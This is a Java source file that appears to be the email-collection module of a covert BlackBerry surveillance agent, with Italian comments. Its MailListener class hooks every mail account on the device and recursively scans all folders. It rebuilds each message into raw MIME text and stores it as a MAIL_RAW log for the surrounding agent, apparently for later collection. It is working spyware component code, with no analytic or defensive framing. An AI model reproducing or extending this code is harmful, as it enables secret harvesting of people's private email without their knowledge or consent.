//#preprocess
/**
 * 
 */
package blackberry.agent.mail;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Enumeration;
import java.util.Random;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.BodyPart;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Header;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException; //#ifdef HAVE_MIME
import net.rim.blackberry.api.mail.MimeBodyPart; //#endif
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.SendListener;
import net.rim.blackberry.api.mail.ServiceConfiguration;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.SupportedAttachmentPart;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
import net.rim.blackberry.api.mail.BodyPart.ContentType;
import net.rim.blackberry.api.mail.event.FolderEvent;
import net.rim.blackberry.api.mail.event.FolderListener;
import net.rim.blackberry.api.mail.event.StoreEvent;
import net.rim.blackberry.api.mail.event.StoreListener;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.IntHashtable;
import blackberry.agent.MessageAgent;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.StringPair;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The listener interface for receiving mail events.
 * The class that is interested in processing a mail
 * event implements this interface, and the object created
 * with that class is registered with a component using the
 * component's <code>addMailListener<code> method. When
 * the mail event occurs, that object's appropriate
 * method is invoked.
 * 
 * @author user1
 */
public final class MailListener implements FolderListener, StoreListener,
        SendListener {

    //#ifdef DEBUG
    static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);

    //#endif

    private static final int MAIL_VERSION = 2009070301;

    MessageAgent messageAgent;
    String[] names;
    private boolean collecting;

    protected static IntHashtable fieldTable;
    private static ServiceRecord[] mailServiceRecords;
    Filter realtimeFilter;
    Filter collectFilter;

    Random random = new Random();

    /**
     * Instantiates a new mail listener.
     * 
     * @param messageAgent_
     *            the message agent_
     */
    public MailListener(final MessageAgent messageAgent_) {
        messageAgent = messageAgent_;
    }

    private void addListeners(final Store store) {
        //#ifdef DEBUG_INFO
        debug.info("Adding listeners to store: " + store.toString());
        //#endif
        store.addFolderListener(this);
        store.addSendListener(this);
        store.addStoreListener(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.StoreListener#batchOperation(net.rim
     * .blackberry.api.mail.event.StoreEvent)
     */
    public void batchOperation(final StoreEvent arg0) {
        //#ifdef DEBUG_INFO
        debug.info("batchOperation: " + arg0);
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.FolderListener#messagesAdded(net.rim
     * .blackberry.api.mail.event.FolderEvent)
     */
    public synchronized void messagesAdded(final FolderEvent folderEvent) {
        final Message message = folderEvent.getMessage();

        boolean added = folderEvent.getType() == FolderEvent.MESSAGE_ADDED;

        //#ifdef DEBUG_INFO
        debug
                .info("Added Message: " + message + " folderEvent: "
                        + folderEvent);
        //#endif

        if (collecting) {
            //#ifdef DEBUG_TRACE
            debug.trace("messagesAdded: ignoring, still collecting");
            //#endif
            return;
        }

        try {
            int type = folderEvent.getType();
            if (type != FolderEvent.MESSAGE_ADDED) {
                //#ifdef DEBUG_INFO
                debug.info("filterMessage type: " + type);
                //#endif
                return;
            }

            final int filtered = realtimeFilter.filterMessage(message,
                    messageAgent.lastcheck);
            if (filtered == Filter.FILTERED_OK) {
                boolean ret = saveLog(message, realtimeFilter.maxMessageSize,
                        "local");
                //#ifdef DEBUG
                if (ret) {
                    debug.trace("messagesAdded: "
                            + message.getFolder().getName());
                }
                //#endif
            }

        } catch (final MessagingException ex) {
            //#ifdef DEBUG
            debug.error("cannot manage added message: " + ex);
            //#endif
        }

        messageAgent.updateMarkup();
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.FolderListener#messagesRemoved(net.
     * rim.blackberry.api.mail.event.FolderEvent)
     */
    public void messagesRemoved(final FolderEvent e) {
        final Message message = e.getMessage();
        //#ifdef DEBUG_INFO
        debug.info("Removed Message" + message);
        //#endif

    }

    /**
     * Removes the listeners.
     * 
     * @param store
     *            the store
     */
    public void removeListeners(final Store store) {
        store.removeFolderListener(this);
        store.removeSendListener(this);
        store.removeStoreListener(this);
    }

    /**
     * Run.
     */
    public void run() {
        //#ifdef DEBUG_TRACE
        debug.trace("run");
        //#endif

        final long timestamp = messageAgent.initMarkup();

        collecting = true;
        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
            names[count] = mailServiceRecords[count].getName();
            //#ifdef DEBUG_TRACE
            debug.trace("Email account name: " + names[count]);
            //#endif

            //names[count] = mailServiceRecords[0].getName();
            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();

            final Folder[] folders = store.list();
            // Scandisco ogni Folder dell'account di posta
            scanFolders(names[count], folders);
        }
        //#ifdef DEBUG_TRACE
        debug.trace("End search");
        //#endif

        collecting = false;
        messageAgent.updateMarkup();
    }

    private synchronized boolean saveLog(final Message message,
            final long maxMessageSize, String storeName) {

        //#ifdef DEBUG_TRACE
        debug.trace("saveLog: " + message + " name: " + storeName);
        //#endif

        ByteArrayOutputStream os = null;
        try {

            final int flags = 1;
            String mail = parseMessage(message, maxMessageSize, storeName);
            int size = message.getSize();
            if (size == -1) {
                size = mail.length();
            }

            final DateTime filetime = new DateTime(message.getReceivedDate());

            final byte[] additionalData = new byte[20];

            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                    false);
            databuffer.writeInt(MAIL_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeInt(size);
            databuffer.writeLong(filetime.getFiledate());
            //#ifdef DBC
            Check.ensures(additionalData.length == 20, "Wrong buffer size");
            //#endif

            //#ifdef DEBUG_TRACE
            debug.trace("saveLog: " + mail);

            //#endif

            messageAgent.createLog(additionalData, mail.getBytes(),
                    LogType.MAIL_RAW);

        } catch (final Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error("saveLog message: " + ex);
            //#endif
            return false;

        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (final IOException e) {
                }
            }
        }

        return true;
    }

    /**
     * scansione ricorsiva della directories.
     * 
     * @param name
     * @param subfolders
     *            the subfolders
     */
    public void scanFolders(String storeName, final Folder[] subfolders) {
        Folder[] dirs;

        if (subfolders == null || subfolders.length <= 0) {
            return;
        }

        for (int count = 0; count < subfolders.length; count++) {

            Folder folder = subfolders[count];
            //#ifdef DEBUG_TRACE
            debug.trace("Folder name: " + folder.getFullName());
            debug.trace("scanFolders getName: " + folder.getName());
            //#endif

            dirs = folder.list();
            scanFolders(storeName, dirs);
            try {
                final Message[] messages = folder.getMessages();

                //#ifdef DEBUG_TRACE
                // stampo le date.
                for (int j = 0; j < messages.length; j++) {
                    final Message message = messages[j];
                    debug.trace("# " + j + " Received: "
                            + message.getReceivedDate().toString() + " Sent: "
                            + message.getSentDate().toString());
                }
                //#endif

                // Scandisco ogni e-mail dell'account di posta
                for (int j = 0; j < messages.length; j++) {
                    try {
                        //#ifdef DEBUG_TRACE
                        debug.trace("message # " + j);
                        //#endif

                        if (j == 6) {
                            //#ifdef DEBUG_TRACE
                            debug.trace("STOP # " + j);
                            //#endif
                        }

                        final Message message = messages[j];

                        //#ifdef DBC
                        Check.asserts(message != null,
                                "scanFolders: message != null");
                        //#endif
                        final int filtered = collectFilter.filterMessage(
                                message, messageAgent.lastcheck);
                        if (filtered == Filter.FILTERED_OK) {
                            //#ifdef DEBUG_TRACE
                            debug.trace("Store name: " + storeName);
                            //#endif
                            saveLog(message, realtimeFilter.maxMessageSize,
                                    storeName);
                        } else if (filtered == Filter.FILTERED_DISABLED) {
                            return;
                        } else if (filtered == Filter.FILTERED_FOUND) {
                            break;
                        }
                    } catch (Exception ex) {
                        //#ifdef DEBUG_ERROR
                        debug.error("message # " + j + " ex:" + ex);
                        //#endif
                    }

                }
            } catch (final MessagingException e) {
                //#ifdef DEBUG_TRACE
                debug.trace("Folder#getMessages() threw " + e.toString());
                //#endif
            } catch (final Exception ex) {
                //#ifdef DEBUG_ERROR
                debug.error("Scanning: " + ex);
                debug.error("Folder: " + folder);
                //#endif
            }
        }
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.SendListener#sendMessage(net.rim.blackberry
     * .api.mail.Message)
     */
    public boolean sendMessage(final Message message) {

        // if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
        //#ifdef DEBUG_INFO
        debug.info("New Send Message: " + message);
        //#endif

        if (collecting) {
            //#ifdef DEBUG_TRACE
            debug.trace("sendMessage: ignoring, still collecting");
            //#endif
            return true;
        }

        try {
            final int filtered = realtimeFilter.filterMessage(message,
                    messageAgent.lastcheck);
            if (filtered == Filter.FILTERED_OK) {
                //TODO: enable saveLog
                //saveLog(message, realtimeFilter.maxMessageSize);
                //#ifdef DEBUG_TRACE
                debug.trace("messagesAdded: " + message.getFolder().getName());
                //#endif
            }

        } catch (final MessagingException ex) {
            //#ifdef DEBUG
            debug.error("cannot manage send message: " + ex);
            //#endif
            return true;
        }

        messageAgent.updateMarkup();

        return true;
    }

    private String parseMessage(final Message message,
            final long maxMessageSize, final String from) {
        Address[] addresses;

        StringBuffer mailRaw = new StringBuffer();

        addAllHeaders(message.getAllHeaders(), mailRaw);
        addFromHeaders(message.getAllHeaders(), mailRaw, from);

        MailParser parser = new MailParser(message);
        Mail mail = parser.parse();

        //#ifdef DEBUG
        debug.trace("Dimensione dell'email: " + message.getSize() + "bytes");
        debug.trace("Data invio dell'email: " + message.getSentDate());
        debug.trace("Oggetto dell'email: " + message.getSubject());
        //#endif

        mailRaw.append("MIME-Version: 1.0\r\n");
        //1234567890123456789012345678
        long rnd = Math.abs(random.nextLong());
        String boundary = "------_=_NextPart_" + rnd;

        if (mail.isMultipart()) {
            mailRaw.append("Content-Type: multipart/alternative; boundary="
                    + boundary + "\r\n\r\n");
            mailRaw.append("\r\n--" + boundary + "\r\n");
        }

        if (mail.hasText()) {
            mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
            mailRaw.append(mail.plainTextMessage);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "\r\n");
        }

        if (mail.hasHtml()) {
            mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
            //mail.append("Content-Transfer-Encoding: quoted-printable");
            mailRaw.append(mail.htmlMessage);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "--\r\n");
        }

        mailRaw.append("\r\n");

        String craftedMail = mailRaw.toString();

        return craftedMail;
    }

    private void addAllHeaders(final Enumeration headers, StringBuffer mail) {

        while (headers.hasMoreElements()) {
            Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                Header header = (Header) headerObj;
                mail.append(header.getName());
                mail.append(header.getValue());
                mail.append("\r\n");
            } else {
                //#ifdef DEBUG_ERROR
                debug.error("Unknown header type: " + headerObj);
                //#endif
            }
        }
    }

    private void addFromHeaders(final Enumeration headers, StringBuffer mail,
            String from) {

        boolean fromFound = false;
        while (headers.hasMoreElements()) {
            Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                Header header = (Header) headerObj;
                if (header.getName().startsWith("From")) {
                    fromFound = true;
                }
            }
        }
        if (!fromFound) {
            //#ifdef DEBUG_INFO
            debug.info("Adding from: " + from);
            //#endif
            mail.append("From: " + from + "\r\n");
        }
    }

    /**
     * Start.
     */
    public void start() {

        final ServiceBook serviceBook = ServiceBook.getSB();
        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");

        names = new String[mailServiceRecords.length];
        //#ifdef DEBUG_TRACE
        debug.trace("Starting: " + mailServiceRecords.length + " accounts");
        //#endif

        // to forever
        realtimeFilter = (Filter) messageAgent.filtersEMAIL
                .get(Filter.TYPE_REALTIME);

        // history
        collectFilter = (Filter) messageAgent.filtersEMAIL
                .get(Filter.TYPE_COLLECT);

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

            try {
                final ServiceConfiguration sc = new ServiceConfiguration(
                        mailServiceRecords[count]);
                final Store store = Session.getInstance(sc).getStore();
                addListeners(store);
            } catch (Exception ex) {
                //#ifdef DEBUG_ERROR
                debug.error("Cannot add listener. Count: " + count);
                //#endif
            }
        }

        //#ifdef DEBUG_TRACE
        debug.trace("Started");
        //#endif
    }

    /**
     * Stop.
     */
    public void stop() {
        //#ifdef DEBUG_TRACE
        debug.trace("Stopping");
        //#endif
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();
            removeListeners(store);
        }
        //#ifdef DEBUG_TRACE
        debug.trace("Stopped");
        //#endif
    }

}
